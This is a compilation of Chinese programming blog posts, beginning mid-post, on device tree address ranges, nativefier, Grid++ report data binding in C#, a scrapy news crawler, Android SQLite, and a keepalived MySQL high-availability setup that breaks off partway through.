            compatible = "samsung,k8f1315ebm", "cfi-flash";
            reg = <2 0 0x4000000>;
        };
    };
 



总线“ external-bus”使用2个单元格来表示地址域，一个是片选号，一个是该片选的设备的基地址偏移。“length”字段仍然是一个单元格，因为只有地址的偏移需要一个范围。所以在这个例子里，每一个reg包含3个单元格：片选，地址偏移，偏移的范围。
由于地址域包含在节点及其子节点中， 所以父节点可以自由地定义任何对总线有意义的寻址方案。设备节点不需要考虑本节点之外的地址域的情况。地址映射必须按照地址域一个一个的进行。
非内存映射设备
有一些设备不是地址映射设备。他们可以有地址范围，但是不能被CPU直接访问。相反，父设备的驱动将代替CPU间接的访问设备。以I2C设备为例，每一个设备分配一个地址，但是没有长度和地址范围。看起来就像为CPU分配地址一样。

       

 i2c@1,0 {
            compatible = "acme,a1234-i2c-bus";
            #address-cells = <1>;
            #size-cells = <0>;
            reg = <1 0 0x1000>;
            rtc@58 {
                compatible = "maxim,ds1338";
                reg = <58>;
            };
        };
 



ranges（地址转换）
我们已经讨论了如何为设备分配地址，但目前这些地址只在设备节点地址域有意义。它还没有描述如何将这些地址映射到CPU可以使用的地址。 根节点总是以CPU的视角来描述地址空间。根节点的子节点已经使用了CPU的地址域，因此不需要任何显式映射。例如，serial@101f0000设备被直接分配地址0x101f0000。
一些非根节点的子节点的设备没有直接使用CPU地址域。 为了获得内存映射地址，设备树必须指定如何将地址从一个域转换到另一个域。ranges属性正是为这一目的而设计的。
下面就是一个简单的例子，展示了一个包含ranges属性的设备树。


/dts-v1/;
/ {
    compatible = "acme,coyotes-revenge";
    #address-cells = <1>;
    #size-cells = <1>;
    ...
    external-bus {
        #address-cells = <2>
        #size-cells = <1>;
        ranges = <0 0  0x10100000   0x10000     // Chipselect 1, Ethernet
                  1 0  0x10160000   0x10000     // Chipselect 2, i2c controller
                  2 0  0x30000000   0x1000000>; // Chipselect 3, NOR Flash
 
 
        ethernet@0,0 {
            compatible = "smc,smc91c111";
            reg = <0 0 0x1000>;
        };
 
        i2c@1,0 {
            compatible = "acme,a1234-i2c-bus";
            #address-cells = <1>;
            #size-cells = <0>;
            reg = <1 0 0x1000>;
            rtc@58 {
                compatible = "maxim,ds1338";
                reg = <58>;
            };
        };
 
        flash@2,0 {
            compatible = "samsung,k8f1315ebm", "cfi-flash";
            reg = <2 0 0x4000000>;
        };
    };
};


 
ranges是一个地址转换列表。ranges表的每一项都是一个组元，包含子地址、父地址和子地址空间区域的大小。每一个字段的大小由子节点的 #address-cells 的值，父节点的 #address-cells 的值，以及子节点的 #size-cells 值决定。 对于我们示例中的外部总线，子地址是2个单元格，父地址是1个单元格，子地址大小也是1个单元格。因此，三项ranges翻译如下：


* Offset 0 from chip select 0 is mapped to address range 0x10100000..0x1010ffff
* Offset 0 from chip select 1 is mapped to address range 0x10160000..0x1016ffff
* Offset 0 from chip select 2 is mapped to address range 0x30000000..0x30ffffff


或者，如果父地址空间和子地址空间相同，则节点可以添加一个空的“ranges”属性。空“ranges”属性的存在意味着子地址空间中的地址将1:1映射到父地址空间。
您可能会问，为什么要使用地址转换，而所有这些都可以用1:1映射来编写。 有些总线(如PCI)具有完全不同的地址空间，其详细信息需要暴露给操作系统。其他的DMA引擎需要知道总线上的真实地址。有时需要将设备分组，因为它们共享相同的软件可编程物理地址映射。是否应该使用1:1映射在很大程度上取决于操作系统和具体的硬件设计信息。
您还应该注意到，i2c@1,0节点中没有ranges属性。原因在于，与外部总线不同，i2c总线上的设备不是映射到CPU地址域中的内存。相反，CPU通过i2c@1,0设备间接访问rtc@58设备。缺少范围属性意味着设备不能被除其父设备之外的任何设备直接访问。
********************************************************************************************************************************************************************************************************
nativefier(一行代码将任意网页转化为桌面应用)
刚刚在看前端九部的手册的时候，发现一个之前没有用过的骚东西，看上去还挺好用，我这个好奇心瞬间就窜的老高了，赶紧试一试，看看这个东西有没有必要收入我的胯下
结果实验完了之后，
必须必须要强行安利给你们
这个骚东西就是nativefier
一个能用一行代码将任意网页转化为桌面应用！！！
很舒服的知道啵！！！
打包速度很快！！！
使用非常简便！！！
还在一次一次的搜索常用的网站？还在一次次的从搜索历史中找常用的网站？没网的时候看网站凉凉？热一热吧各位看官，不如来试试nativefier，没网也能看（视频网站没试过，应该是不行的）
把常用的网站转化成桌面应用，这样就不用每次都去找对应网站了，而且我试过了，他可以在没有网的情况下使用，but需要加载的图片和超链接在没有网的情况下是加载不出来的，不过总体来说是挺好用的，我把常用的各个框架的官网都搞成了桌面应用，这样以后在没网的情况下也能看看文档，舒舒服服
使用
　　全局安装nativefier：

npm install nativefier -g// 使用npm的前提是装好node环境啊，没node环境的看官别上来就npm，能起作用我直播吃键盘

　　 愉快使用：

 nativefier devdocs.io
// 想要为APP取名的话可以添加参数 --name "Some Awesome App"
// 如: nativefier --name "Devdocs" devdocs.io// devdocs.io为网站地址看官们可以尝试一下试一试，包舒服好吧，不舒服的话自己解决好吧，我可没钱带你们大保健舒服一下

********************************************************************************************************************************************************************************************************
在Winform开发中使用Grid++报表
之前一直使用各种报表工具，如RDLC、DevExpress套件的XtraReport报表，在之前一些随笔也有介绍，最近接触锐浪的Grid++报表，做了一些测试例子和辅助类来处理报表内容，觉得还是很不错的，特别是它的作者提供了很多报表的设计模板案例，功能还是非常强大的。试着用来做一些简单的报表，测试下功能，发现常规的二维表、套打、条形码二维码等我关注的功能都有，是一个比较强大的报表控件，本篇随笔主要介绍在Winform开发中使用Grid++报表设计报表模板，以及绑定数据的处理过程。
1、报表模板设计
这个报表系统，报表模板提供了很多案例，我们可以大概浏览下其功能。

它对应在相应的文件目录里面，我们可以逐一查看了解下，感觉提供这么多报表还是很赞的，我们可以参考着来用，非常好。

整个报表主要是基于现有数据进行一个报表的模板设计的，如果要预览效果，我们一般是需要绑定现有的数据，可以从各种数据库提供数据源，然后设计报表模板，进行实时的数据和格式查看及调整。
空白的报表模板大概如下所示，包含页眉页脚，以及明细表格的内容。

根据它的教程，模仿着简单的做了一个报表，也主要是设计报表格式的调整，和数据源的处理的关系，我们做一个两个报表就可以很快上手了。
为了动态的加入我们表格所需要的列，我们可以通过数据库里面的字段进行加入，首先提供数据源，指定我们具体的表即可（如果是自定义的信息，则可以手工添加字段）

这个里面就是配置不同的数据库数据源了

如SQLServer数据库的配置信息如下。

为了方便，我们可以利用案例的Access数据库，也就是Northwind.mdb来测试我们的报表，弄好这些我们指定对应的数据表数据即可。

这里面配置好数据库表信息后，我们就可以用它生成相关的字段和对应的列信息了

修改列的表头，让它符合中文的表头列，如下所示。

我们在页脚出，加入了打印时间，页码的一些系统变量，具体操作就是添加一个综合文本，然后在内容里面插入指定的域内容即可，如下所示

预览报表，我们就可以看到具体的报表格式显示了。
 
通过上面的操作，感觉生成一个报表还是很方便的，接着我有根据需要做了一个二维码的报表显示，方便打印资产标签。
 
绑定数据源显示的报表视图如下所示，看起来还是蛮好的。

 
2、数据绑定
一般我们绑定数据源，有的时候可以直接指定数据库连接，有时候可以绑定具体的数据列表，如DataTable或者List<T>这样的数据源，不同的方式报表控件的代码绑定不同。
直接绑定数据表的路径如下所示。

        /// <summary>
        /// 普通连接数据库的例子-打印预览
        /// </summary>
        private void btnNormalDatabase_Click(object sender, EventArgs e)
        {
            Report = new GridppReport();
            string reportPath = Path.Combine(Application.StartupPath, "Reports\\testgrid++.grf");
            string dbPath = Path.Combine(Application.StartupPath, "Data\\NorthWind.mdb");

            //从对应文件中载入报表模板数据
            Report.LoadFromFile(reportPath);
            //设置与数据源的连接串，因为在设计时指定的数据库路径是绝对路径。
            if (Report.DetailGrid != null)
            {
                string connstr = Utility.GetDatabaseConnectionString(dbPath);
                Report.DetailGrid.Recordset.ConnectionString = connstr;
            }

            Report.PrintPreview(true);
        }

而如果需要绑定和数据库无关的动态数据源，那么就需要通过控件的FetchRecord进行处理了，如下代码所示。

Report.FetchRecord += new _IGridppReportEvents_FetchRecordEventHandler(ReportFetchRecord);

通过这样我们增加每一个对应的列单元格信息，如下是随带案例所示

        //在C#中一次填入一条记录不能成功，只能使用一次将记录全部填充完的方式
        private void ReportFetchRecord()
        {
            //将全部记录一次填入
            Report.DetailGrid.Recordset.Append();
            FillRecord1();
            Report.DetailGrid.Recordset.Post();

            Report.DetailGrid.Recordset.Append();
            FillRecord2();
            Report.DetailGrid.Recordset.Post();

            Report.DetailGrid.Recordset.Append();
            FillRecord3();
            Report.DetailGrid.Recordset.Post();
        }

        private void FillRecord1()
        {
            C1Field.AsString = "A";
            I1Field.AsInteger = 1;
            F1Field.AsFloat = 1.01;
        }

        private void FillRecord2()
        {
            C1Field.AsString = "B";
            I1Field.AsInteger = 2;
            F1Field.AsFloat = 1.02;
        }

        private void FillRecord3()
        {
            C1Field.AsString = "C";
            I1Field.AsInteger = 3;
            F1Field.AsFloat = 1.03;
        }

这样处理肯定很麻烦，我们常规做法是弄一个辅助类，来处理DataTable和List<T>等这样类型数据的动态增加操作。

        /// <summary>
        /// 绑定实体类集合的例子-打印预览
        /// </summary>
        private void btnBindList_Click(object sender, EventArgs e)
        {
            Report = new GridppReport();
            //从对应文件中载入报表模板数据
            string reportPath = Path.Combine(Application.StartupPath, "Reports\\testList.grf");
            Report.LoadFromFile(reportPath);
            Report.FetchRecord += ReportList_FetchRecord;

            Report.PrintPreview(true);
        }
        /// <summary>
        /// 绑定DataTable的例子-打印预览
        /// </summary>
        private void btnBindDatatable_Click(object sender, EventArgs e)
        {
            Report = new GridppReport();
            //从对应文件中载入报表模板数据
            string reportPath = Path.Combine(Application.StartupPath, "Reports\\testList.grf");
            Report.LoadFromFile(reportPath);
            Report.FetchRecord += ReportList_FetchRecord2;

            Report.PrintPreview(true);
        }

        private void ReportList_FetchRecord()
        {
            List<ProductInfo> list = BLLFactory<Product>.Instance.GetAll();
            GridReportHelper.FillRecordToReport<ProductInfo>(Report, list);
        }
        private void ReportList_FetchRecord2()
        {
            var dataTable = BLLFactory<Product>.Instance.GetAllToDataTable();
            GridReportHelper.FillRecordToReport(Report, dataTable);
        }

其中辅助类 GridReportHelper 代码如下所示。

    /// <summary>
    /// Gird++报表的辅助类
    /// </summary>
    public class GridReportHelper
    {
        private struct MatchFieldPairType
        {
            public IGRField grField;
            public int MatchColumnIndex;
        }

        /// <summary>
        /// 将 DataReader 的数据转储到 Grid++Report 的数据集中
        /// </summary>
        /// <param name="Report">报表对象</param>
        /// <param name="dr">DataReader对象</param>
        public static void FillRecordToReport(IGridppReport Report, IDataReader dr)
        {
            MatchFieldPairType[] MatchFieldPairs = new MatchFieldPairType[Math.Min(Report.DetailGrid.Recordset.Fields.Count, dr.FieldCount)];

            //根据字段名称与列名称进行匹配，建立DataReader字段与Grid++Report记录集的字段之间的对应关系
            int MatchFieldCount = 0;
            for (int i = 0; i < dr.FieldCount; ++i)
            {
                foreach (IGRField fld in Report.DetailGrid.Recordset.Fields)
                {
                    if (string.Compare(fld.RunningDBField, dr.GetName(i), true) == 0)
                    {
                        MatchFieldPairs[MatchFieldCount].grField = fld;
                        MatchFieldPairs[MatchFieldCount].MatchColumnIndex = i;
                        ++MatchFieldCount;
                        break;
                    }
                }
            }

            // 将 DataReader 中的每一条记录转储到Grid++Report 的数据集中去
            while (dr.Read())
            {
                Report.DetailGrid.Recordset.Append();
                for (int i = 0; i < MatchFieldCount; ++i)
                {
                    var columnIndex = MatchFieldPairs[i].MatchColumnIndex;
                    if (!dr.IsDBNull(columnIndex))
                    {
                        MatchFieldPairs[i].grField.Value = dr.GetValue(columnIndex);
                    }
                }
                Report.DetailGrid.Recordset.Post();
            }
        }

        /// <summary>
        /// 将 DataTable 的数据转储到 Grid++Report 的数据集中
        /// </summary>
        /// <param name="Report">报表对象</param>
        /// <param name="dt">DataTable对象</param>
        public static void FillRecordToReport(IGridppReport Report, DataTable dt)
        {
            MatchFieldPairType[] MatchFieldPairs = new MatchFieldPairType[Math.Min(Report.DetailGrid.Recordset.Fields.Count, dt.Columns.Count)];

            //根据字段名称与列名称进行匹配，建立DataReader字段与Grid++Report记录集的字段之间的对应关系
            int MatchFieldCount = 0;
            for (int i = 0; i < dt.Columns.Count; ++i)
            {
                foreach (IGRField fld in Report.DetailGrid.Recordset.Fields)
                {
                    if (string.Compare(fld.Name, dt.Columns[i].ColumnName, true) == 0)
                    {
                        MatchFieldPairs[MatchFieldCount].grField = fld;
                        MatchFieldPairs[MatchFieldCount].MatchColumnIndex = i;
                        ++MatchFieldCount;
                        break;
                    }
                }
            }

            // 将 DataTable 中的每一条记录转储到 Grid++Report 的数据集中去
            foreach (DataRow dr in dt.Rows)
            {
                Report.DetailGrid.Recordset.Append();
                for (int i = 0; i < MatchFieldCount; ++i)
                {
                    var columnIndex = MatchFieldPairs[i].MatchColumnIndex;
                    if (!dr.IsNull(columnIndex))
                    {
                        MatchFieldPairs[i].grField.Value = dr[columnIndex];
                    }
                }
                Report.DetailGrid.Recordset.Post();
            }
        }

        /// <summary>
        /// List加载数据集
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="Report">报表对象</param>
        /// <param name="list">列表数据</param>
        public static void FillRecordToReport<T>(IGridppReport Report, List<T> list)
        {
            Type type = typeof(T);  //反射类型             

            MatchFieldPairType[] MatchFieldPairs = new MatchFieldPairType[Math.Min(Report.DetailGrid.Recordset.Fields.Count, type.GetProperties().Length)];

            //根据字段名称与列名称进行匹配，建立字段与Grid++Report记录集的字段之间的对应关系
            int MatchFieldCount = 0;
            int i = 0;
            MemberInfo[] members = type.GetMembers();
            foreach (MemberInfo memberInfo in members)
            {
                foreach (IGRField fld in Report.DetailGrid.Recordset.Fields)
                {
                    if (string.Compare(fld.Name, memberInfo.Name, true) == 0)
                    {
                        MatchFieldPairs[MatchFieldCount].grField = fld;
                        MatchFieldPairs[MatchFieldCount].MatchColumnIndex = i;
                        ++MatchFieldCount;
                        break;
                    }
                }
                ++i;
            }
            
            // 将 DataTable 中的每一条记录转储到 Grid++Report 的数据集中去
            foreach (T t in list)
            {
                Report.DetailGrid.Recordset.Append();
                for (i = 0; i < MatchFieldCount; ++i)
                {
                    object objValue = GetPropertyValue(t, MatchFieldPairs[i].grField.Name);
                    if (objValue != null)
                    {
                        MatchFieldPairs[i].grField.Value = objValue;
                    }
                }
                Report.DetailGrid.Recordset.Post();
            }
        }

        /// <summary>
        /// 获取对象实例的属性值
        /// </summary>
        /// <param name="obj">对象实例</param>
        /// <param name="name">属性名称</param>
        /// <returns></returns>
        public static object GetPropertyValue(object obj, string name)
        {
            //这个无法获取基类
            //PropertyInfo fieldInfo = obj.GetType().GetProperty(name, bf);
            //return fieldInfo.GetValue(obj, null);

            //下面方法可以获取基类属性
            object result = null;
            foreach (PropertyDescriptor prop in TypeDescriptor.GetProperties(obj))
            {
                if (prop.Name == name)
                {
                    result = prop.GetValue(obj);
                }
            }
            return result;
        }
    }

绑定数据的报表效果如下所示 

导出报表为PDF也是比较常规的操作，这个报表控件也可以实现PDF等格式文件的导出，如下所示。

        private void btnExportPdf_Click(object sender, EventArgs e)
        {
            List<ProductInfo> list = BLLFactory<Product>.Instance.GetAll();

            //从对应文件中载入报表模板数据
            string reportPath = Path.Combine(Application.StartupPath, "Reports\\testList.grf");
            GridExportHelper helper = new GridExportHelper(reportPath);

            string fileName = "d:\\my.pdf";
            var succeeded = helper.ExportPdf(list, fileName);
            if(succeeded)
            {
                Process.Start(fileName);
            }
        }


以上就是利用这个报表控件做的一些功能测试和辅助类封装，方便使用。
********************************************************************************************************************************************************************************************************
scrapy 基础使用以及错误方案
 
原先用的是selenium(后面有时间再写)，这是第一次使用scrapy这个爬虫框架，所以记录一下这个心路历程，制作简单的爬虫其实不难，你需要的一般数据都可以爬取到。
 
 下面是我的目录，除了main.py以外，都是代码自动生成的  :）。

各个目录作用：
1、sina是我自己创建的文件夹用来盛放整个项目的，随便起名字。
2、第一个sinaSpeder文件夹内，有一个scrapy.cfg配置文件和sinaSpeder的文件夹

scrapy.cfg：配置文件，不需要更改
sinaSpeder文件夹

3、第二个sinaSpeder文件夹

init.py ：特定文件，指明二级first_spider目录为一个python模块
item.py：定义需要的item类【实验中需要用到】
pipelines.py：管道文件，传入item.py中的item类，清理数据，保存或入库
settings.py：设置文件，例如设置用户代理和初始下载延迟
spiders目录

4、spiders

init.py ：特定文件，指明二级first_spider目录为一个python模块
sina.py：盛放自定义爬虫的文件，负责获取html的数据和传入pipline管道中进行数据存放等

 
废话不多说，开练~~
第一步创建爬虫项目：

scrapy startproject  sinaSpeder（项目名）
（用命令创建主要是可以自动生成一个包含默认文件的目录）

第二步输入网址：
 

scrapy genspider sina "sina.com.cn"  （这个名字是spiders里面的名字，后面的链接是要爬取的链接）

 
第三步修改代码：参考自：
items.py写入：


# -*- coding: utf-8 -*-

# Define here the models for your scraped items
#
# See documentation in:
# https://doc.scrapy.org/en/latest/topics/items.html

import scrapy
import sys
# reload(sys)
# sys.setdefaultencoding("utf-8")

class SinaspederItem(scrapy.Item):
    # 大类的标题和url
    parentTitle = scrapy.Field()
    parentUrls = scrapy.Field()

    # 小类的标题和子url
    subTitle = scrapy.Field()
    subUrls = scrapy.Field()

    # 小类目录存储路径
    subFilename = scrapy.Field()

    # 小类下的子链接
    sonUrls = scrapy.Field()

    # 文章标题和内容
    head = scrapy.Field()
    content = scrapy.Field()

View Code
sina.py写入：


# -*- coding: utf-8 -*-

import scrapy
import os
from sinaSpeder.items import SinaspederItem
import sys

# reload(sys)
# sys.setdefaultencoding("utf-8")


class SinaSpider(scrapy.Spider):
    name = "sina"
    allowed_domains = ["sina.com.cn"]
    start_urls = ['http://news.sina.com.cn/guide/']

    def parse(self, response):
        items = []
        # 所有大类的url 和 标题
        parentUrls = response.xpath('//div[@id="tab01"]/div/h3/a/@href').extract()
        parentTitle = response.xpath('//div[@id="tab01"]/div/h3/a/text()').extract()

        # 所有小类的ur 和 标题
        subUrls = response.xpath('//div[@id="tab01"]/div/ul/li/a/@href').extract()
        subTitle = response.xpath('//div[@id="tab01"]/div/ul/li/a/text()').extract()

        # 爬取所有大类
        for i in range(0, len(parentTitle)):
            # 指定大类目录的路径和目录名
            parentFilename = "./Data/" + parentTitle[i]

            # 如果目录不存在，则创建目录
            if (not os.path.exists(parentFilename)):
                os.makedirs(parentFilename)

            # 爬取所有小类
            for j in range(0, len(subUrls)):
                item = SinaspederItem()

                # 保存大类的title和urls
                item['parentTitle'] = parentTitle[i]
                item['parentUrls'] = parentUrls[i]

                # 检查小类的url是否以同类别大类url开头，如果是返回True (sports.sina.com.cn 和 sports.sina.com.cn/nba)
                if_belong = subUrls[j].startswith(item['parentUrls'])

                # 如果属于本大类，将存储目录放在本大类目录下
                if (if_belong):
                    subFilename = parentFilename + '/' + subTitle[j]
                    # 如果目录不存在，则创建目录
                    if (not os.path.exists(subFilename)):
                        os.makedirs(subFilename)

                    # 存储 小类url、title和filename字段数据
                    item['subUrls'] = subUrls[j]
                    item['subTitle'] = subTitle[j]
                    item['subFilename'] = subFilename

                    items.append(item)

        # 发送每个小类url的Request请求，得到Response连同包含meta数据 一同交给回调函数 second_parse 方法处理
        for item in items:
            yield scrapy.Request(url=item['subUrls'], meta={'meta_1': item}, callback=self.second_parse)

    # 对于返回的小类的url，再进行递归请求
    def second_parse(self, response):
        # 提取每次Response的meta数据
        meta_1 = response.meta['meta_1']

        # 取出小类里所有子链接
        sonUrls = response.xpath('//a/@href').extract()

        items = []
        for i in range(0, len(sonUrls)):
            # 检查每个链接是否以大类url开头、以.shtml结尾，如果是返回True
            if_belong = sonUrls[i].endswith('.shtml') and sonUrls[i].startswith(meta_1['parentUrls'])

            # 如果属于本大类，获取字段值放在同一个item下便于传输
            if (if_belong):
                item = SinaspederItem()
                item['parentTitle'] = meta_1['parentTitle']
                item['parentUrls'] = meta_1['parentUrls']
                item['subUrls'] = meta_1['subUrls']
                item['subTitle'] = meta_1['subTitle']
                item['subFilename'] = meta_1['subFilename']
                item['sonUrls'] = sonUrls[i]
                items.append(item)

        # 发送每个小类下子链接url的Request请求，得到Response后连同包含meta数据 一同交给回调函数 detail_parse 方法处理
        for item in items:
            yield scrapy.Request(url=item['sonUrls'], meta={'meta_2': item}, callback=self.detail_parse)

    # 数据解析方法，获取文章标题和内容
    def detail_parse(self, response):
        item = response.meta['meta_2']
        content = ""
        head = response.xpath('//h1[@id="main_title"]/text()')
        content_list = response.xpath('//div[@id="artibody"]/p/text()').extract()

        # 将p标签里的文本内容合并到一起
        for content_one in content_list:
            content += content_one

        item['head'] = head
        item['content'] = content

        yield item

View Code
pipelines.py写入：

# -*- coding: utf-8 -*-

from scrapy import signals
import sys
class SinaspederPipeline(object):
    def process_item(self, item, spider):
        sonUrls = item['sonUrls']
        # 文件名为子链接url中间部分，并将 / 替换为 _，保存为 .txt格式
        filename = sonUrls[7:-6].replace('/','_')
        filename += ".txt"
        fp = open(item['subFilename']+'/'+filename, 'w')
        fp.write(item['content'])
        fp.close()

        return item

 
setting.py写入：

# 设置管道文件
ITEM_PIPELINES = {   'sinaSpeder.pipelines.SinaspederPipeline': 300,}

main.py写入:
 
 

from scrapy import cmdline
cmdline.execute("scrapy crawl sina".split())       

 
运行有两种方法：
1、这里创建了main。py文件，所以可以直接运行这个文件。
2、通过命令行

scrapy crawl sina    （这个是进入...>sina>sinaSpeder 文件夹后运行的）

 
 
第四步：
运行开始后，多出一个data文件夹，这就是要爬取的东西

 
 
注：问题总结
1、我最初是运行下面这个，发现报错，后来试试spiders中的sina.py文件，结果成功了

scrapy crawl sinaSpeder  

2、如果你建立的工程名字和我的不一样，所有涉及项目名称的文件都要改过来，少一个都会报错。
3、爬虫运行有可能会被封ip使得无法再访问这个网站了！这就需要使用反爬虫技术，以后再讲。
 
 
 
 
 
参考：
https://www.jianshu.com/p/fd443ad67c5b?utm_campaign
https://www.cnblogs.com/xinyangsdut/p/7631163.html
********************************************************************************************************************************************************************************************************
安卓开发笔记（十二）：SQLite数据库储存（上）
SQLite数据库存储
 创建数据库
Android专门提供了一个 SQLiteOpenHelper帮助类对数据库进行创建和升级
SQLiteOpenHelper需要创建一个自己的帮助类去继承它并且重写它的两个抽象方法，即 onCreate() 和 onUpgrade()
SQLiteOpenHelper 中有两个重要的实例方法：getReadableDatabase() 和 getWritableDatabase()，第一个方法可以在磁盘空间已满的时候，只读数据，而第二种方法在空间已满的时候，则会出现异常
创建一个名为 BookStore.db 的数据库
在这个数据库中新建一张 book表，表中有 id（主键）、作者、价格、页数和书名等列
我们在我们的项目当中新建 MyDatabaseHelper类，并继承自 SQLiteOpenHelper，后面则可以在我们的主活动当中启用这段新建的代码，这个类的代码如下：

package com.example.lenovo.studyittwo;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.widget.Toast;

public class MyDatabaseHelper extends SQLiteOpenHelper {
    private static final String CREATE_BOOK = "create table book("
            +"id integer primary key autoincrement,"
            +"author text,"
            +"price real,"
            +"pages integer,"
            +"name text)";

    private Context mContext;

    /**
     * 构造方法
     * @param context
     * @param name 数据库名
     * @param factory 允许我们在查询数据的时候返回一个自定义的 Cursor，一般都是传入 null
     * @param version 当前数据库的版本号，可用于对数据库进行升级操作
     */
    public MyDatabaseHelper(Context context, String name, SQLiteDatabase.CursorFactory factory, int version) {
        super(context, name, factory, version);
        mContext = context;
    }

    /**
     * 创建数据库
     * @param db
     */
    @Override
    public void onCreate(SQLiteDatabase db) {
        // 执行建表语句
        db.execSQL(CREATE_BOOK);
        Toast.makeText(mContext,"创建数据库功",Toast.LENGTH_LONG).show();
    }

    /**
     * 升级数据库
     * @param db
     * @param oldVersion
     * @param newVersion
     */
    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

    }

}

下面是主活动的代码。也十分容易理解，我们在一个按钮的事件当中加入主活动与这个类相联系的函数就可以了：

package com.example.lenovo.studyittwo;


import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {
    private MyDatabaseHelper dbHelper;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // 构建MyDatabaseHelper对象，指定数据库名为"BookStore.db、版本号为1
        dbHelper = new MyDatabaseHelper(this, "BookStore.db", null, 1);

        Button btn_create_database = (Button) findViewById(R.id.creat);
        btn_create_database.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                // 创建或打开一个现有的数据库（已存在则打开，否则创建一个新的）
                dbHelper.getWritableDatabase();
            }
        });


    }}

下面是我们主界面的代码，只需要创建一个按钮就可以了：

<?xml version="1.0" encoding="utf-8"?>
<android.support.constraint.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

   <Button
       android:id="@+id/creat"
       android:layout_width="match_parent"
       android:layout_height="wrap_content"
       android:text="Creat database"/>

</android.support.constraint.ConstraintLayout>

最后，我们只需要按住这个按钮，界面上就会弹出“数据库创建成功”的toast资阳区，再次点击的时候就不会出现了，但我们可以使用另外的的方法来查看我们创建数据库成功没，打开cmd就可以很容易地查看了。
********************************************************************************************************************************************************************************************************
基于keepalived搭建MySQL热机集群
背景
MySQL的高可用方案一般有如下几种：
keepalived+双主，MHA，MMM，Heartbeat+DRBD，PXC，Galera Cluster
比较常用的是keepalived+双主，MHA和PXC。
对于小公司，一般推荐使用keepalived+双主，便于维护。
环境

mysql双主配置
1. 修改配置文件
master1中有关复制的配置如下：

[mysqld]
log-bin=mysql-bin
server-id=1
log_slave_updates=1


master2中有关复制的配置如下：

[mysqld]
log-bin=mysql-bin
server-id=2
log_slave_updates=1
read_only=1


改完之后把两个数据库都重启了
2. 创建复制用户
master1中创建：

CREATE USER 'repl'@'10.1.80.114' IDENTIFIED BY 'Mysql@2019';
GRANT REPLICATION SLAVE ON *.* TO 'repl'@'10.1.80.114';


master2中创建：

CREATE USER 'repl'@'10.1.80.113' IDENTIFIED BY 'Mysql@2019';
GRANT REPLICATION SLAVE ON *.* TO 'repl'@'10.1.80.113';


3. 执行CHANGE MASTER TO语句
因是从头搭建MySQL主从复制集群，所以不需要获取全局读锁来得到二进制日志文件的位置，直接根据show master status的输出来确认。

master1上执行：

CHANGE MASTER TO
  MASTER_HOST='10.1.80.114',
  MASTER_USER='repl',
  MASTER_PASSWORD='Mysql@2019',
  MASTER_LOG_FILE='mysql-bin.000001',
  MASTER_LOG_POS=154;


master2上执行：　　

CHANGE MASTER TO
  MASTER_HOST='10.1.80.113',
  MASTER_USER='repl',
  MASTER_PASSWORD='Mysql@2019',
  MASTER_LOG_FILE='mysql-bin.000001',
  MASTER_LOG_POS=154;


4. 分别在两个节点上执行start slave;语句
并通过show slave status\G查看复制是否搭建成功。
出现如下内容说明成功。
 
5、数据同步测试
在两侧插入数据发现正常同步。
 keepalived配置
1、安装依赖包

yum install gcc 
yum install openssl*


2、下载软件，解压编译

#下载
wget   http://www.keepalived.org/software/keepalived-2.0.10.tar.gz
#解压
tar -zxvf keepalived-2.0.10.tar.gz 
#编译
./configure --prefix=/keepalived

3、初始化以及启动

# keepalived启动脚本变量引用文件，默认文件路径是/etc/sysconfig/，也可以不做软链接，直接修改启动脚本中文件路径即可（安装目录下）
[root@localhost /]# cp /keepalived/etc/sysconfig/keepalived  /etc/sysconfig/keepalived 
 
# 将keepalived主程序加入到环境变量（安装目录下）
[root@localhost /]# cp /keepalived/sbin/keepalived /usr/sbin/keepalived
 
# keepalived启动脚本（源码目录下），放到/etc/init.d/目录下就可以使用service命令便捷调用
[root@localhost /]# cp /tmp/keepalived-2.0.10/keepalived/etc/init.d/keepalived  /etc/init.d/keepalived
 
# 将配置文件放到默认路径下
[root@localhost /]# mkdir /etc/keepalived
[root@localhost /]# cp /keepalived/etc/keepalived/keepalived.conf /etc/keepalived/keepalived.conf

#加为系统服务：
chkconfig --add keepalived
#开机启动：
chkconfig keepalived on
#查看开机启动的服务：
chkconfig --list
#启动、关闭、重启
service keepalived start|stop|restart

4、修改配置文件
master1
vi /etc/keepalived/keepalived.conf

! Configuration File for keepalived
       
global_defs {
notification_email {
ops@wangshibo.cn
tech@wangshibo.cn
}
       
notification_email_from ops@wangshibo.cn
smtp_server 127.0.0.1 
smtp_connect_timeout 30
router_id MASTER-HA
}
       
vrrp_script chk_mysql_port {            #检测mysql服务是否在运行。有很多方式，比如进程，用脚本检测等等
    script "/keepalived/chk_mysql.sh"   #这里通过脚本监测
    interval 2                          #脚本执行间隔，每2s检测一次
    weight -5                           #脚本结果导致的优先级变更，检测失败（脚本返回非0）则优先级 -5
    fall 2                              #检测连续2次失败才算确定是真失败。会用weight减少优先级（1-255之间）
    rise 1                              #检测1次成功就算成功。但不修改优先级
}
       
vrrp_instance VI_1 {
    state MASTER    
    interface eth2          #指定虚拟ip的网卡接口
    mcast_src_ip 10.1.80.113
    virtual_router_id 51    #路由器标识，MASTER和BACKUP必须是一致的
    priority 101            #数字越大，优先级越高，同一个vrrp_instance下，MASTER的优先级必须大于BACKUP的优先级。这样MASTER故障恢复后，就可以将VIP资源再次抢回来 
    advert_int 1         
    authentication {   
        auth_type PASS 
        auth_pass 1111     
    }
    virtual_ipaddress {    
        10.1.80.119
    }
      
track_script {               
   chk_mysql_port             
}
}


编写切换脚本。KeepAlived做心跳检测，如果Master的MySQL服务挂了(3306端口挂了),那么它就会选择自杀。
Slave的KeepAlived通过心跳检测发现这个情况，就会将VIP的请求接管
vi chk_mysql.sh

#!/bin/bash
counter=$(netstat -na|grep "LISTEN"|grep "3306"|wc -l)
